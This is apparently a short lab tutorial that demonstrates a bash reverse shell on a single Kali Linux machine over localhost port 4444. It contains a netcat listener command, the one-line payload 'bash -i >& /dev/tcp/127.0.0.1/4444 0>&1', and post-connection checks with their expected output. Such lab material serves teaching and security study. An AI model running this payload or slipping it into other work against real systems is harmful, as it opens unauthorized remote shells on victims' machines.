
# Practical Demo – Reverse Shell on Kali Linux

## 🔧 Setup
- **Attacker Machine**: Kali Linux (localhost)
- **Victim Machine**: Same Kali Linux (safe and ethical)
- **IP Used**: `127.0.0.1`
- **Port**: `4444`

## 📋 Step-by-Step Execution

### Step 1: Start Listener (Attacker)
- Open **Terminal 1**
- Run the following command:
  ```
  nc -nvlp 4444
  ```

#### Expected output:
-listening on [any] 4444 ...

### Step 2: Trigger Reverse Shell (Victim)
- Open Terminal 2
- Switch to bash shell (required for /dev/tcp support):
- Run the reverse shell payload:
```
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
```
- Note: No output appears in the victim terminal — the connection is sent silently.

### Step 3: Verify Shell Access (Attacker)
- Go back to Terminal 1 (Attacker)
- You will see a new connection message like
```
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 48546
```
- Now run these verification commands:

  ```
  whoami
  pwd
  id
  hostname
  ```
  #### Expected outputs:
    - whoami → kali
    - pwd → /home/kali
    - id → uid=1000(kali) gid=1000(kali) groups=1000(kali),...
    - hostname → kali
